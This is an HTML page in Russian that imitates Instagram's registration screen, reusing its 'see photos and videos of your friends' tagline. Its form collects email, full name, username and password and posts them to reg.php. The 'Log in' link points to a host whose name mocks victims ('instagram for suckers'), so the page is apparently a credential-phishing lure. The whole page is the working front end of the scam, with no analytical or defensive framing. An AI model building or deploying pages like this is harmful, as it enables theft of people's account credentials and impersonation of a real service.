<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title></title>
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
	<style type="text/css">
		body{
			background: #d6cece;
		};
		input{

		}
	</style>
</head>
<body>
	<div class="card col-3 mx-auto mt-5 text-center pt-3">
		<h5 class="" style="font-size: 1rem">Зарегистрируйтесь, чтобы смотреть фото и видео ваших друзей.</h5>
	<form action="reg.php" method="POST">
		<input type="text" name="email" placeholder="Эл. адрес" class="w-100 form-control mb-2 mt-1">
		<input type="text" name="name" placeholder="Имя и фамилия" class="w-100 form-control mb-2">
		<input type="text" name="nick" placeholder="Имя пользователя" class="w-100 form-control mb-2">
		<input type="text" name="password" placeholder="Пароль" class="w-100 form-control mb-2">
		<div>
		<button type="submit" class="btn bg-primary text-white w-100 mb-2">Регистрация</button>
		</div>
	</form>
	</div>
	<div class="card col-3 mx-auto border mt-2 text-center">
		<div class="row mx-auto">
		<p class="">Есть аккаунт?</p>
		<a href="http://instagramdlyalohov/auto.php" class="text-primary">
		Войти
		</a>
		</div>
	</div>
</body>
</html>